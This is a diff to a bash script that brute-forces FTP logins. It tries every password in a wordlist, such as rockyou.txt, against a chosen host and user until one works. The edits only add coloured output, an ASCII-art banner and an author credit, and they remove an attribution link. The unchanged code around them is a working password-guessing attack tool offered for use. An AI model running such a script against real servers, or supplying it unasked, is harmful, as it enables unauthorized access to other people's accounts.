@@ -4,15 +4,31 @@
 # Simple script to brute force in protocol ftp
 # Date: 2017/07/18 - version 0.1
 #
-# Inspired by: https://gist.github.com/hc0d3r/5845045
 # Author: João Lucas <joaolucas@linuxmail.org>
+
+
+
+function_colors() {
+	escape="\033";
+	white="${escape}[0m";
+	red="${escape}[31m";
+	green="${escape}[32m";
+	yellow="${escape}[33m";
+	blue="${escape}[34m";
+	cyan="${escape}[36m";
+	reset="${escape}[0m";
+}
+
 
 
 function_usage() {
 	cat << EOF
 	Simple script to brute force in protocol ftp
+
 	Usage: $0 -t <host|ip> -w <wordlist> -u <user>
 	Example: $0 -t 192.168.0.1 -w /home/user/rockyou.txt -u admin
+
+	Author: João Lucas <joaolucas@linuxmail.org>
 EOF
 
 exit 1;
@@ -52,18 +68,38 @@ done
 [ $wordlist ] || function_usage;
 [ $user ] || function_usage;
 
-echo -e "\n[  TARGET  ]: $host \n[   USER   ]: $user \n[ WORDLIST ]: `wc -l $wordlist | awk '{print $1}'` \n"
+function_colors;
+
+cat << EOF
+
+
+88            ad88    ad88
+88           d8V     d8V     ,d
+88           88      88      88
+88,dPPYba, x0BRUTE x0FORCE x0FTPxz 8b,dPPYba,
+88P'    "8a  88      88      88    88P     V8a
+88       d8  88      88      88    88       d8
+88b,   ,a8V  88      88      88,   88b,   ,a8n
+8YVYbbd8VN   88      88      VY888 88ddYbbdPV
+                                   88
+	Author: João Lucas         88
+
+EOF
+
+
+echo -e "\n [${blue}  TARGET  ${white}]: $host\n [${blue}   USER   ${white}]: $user\n [${blue} WORDLIST ${white}]: `wc -l $wordlist | awk '{print $1}'` \n"
+
 
 
 for password in $(cat $wordlist); do
-	echo -e "[  TEST  ] Testing the password: $password"
+	echo -e "[${yellow}  TEST  ${white}]${white} Testing the password: ${cyan} $password"
 	test=$(function_bfftp $host $user $password)
 	result=$(echo $?)
 
 	if test $result -eq 1; then
-		echo -e "[ FAILED ] Password incorrect! \n"
+		echo -e "[${red} FAILED ${white}] Password incorrect! \n"
 	else
-		echo -e "[   OK   ] Password correct: $password"
+		echo -e "[${green}   OK   ${white}] Password correct: ${green} $password"
 		break
 	fi
 done
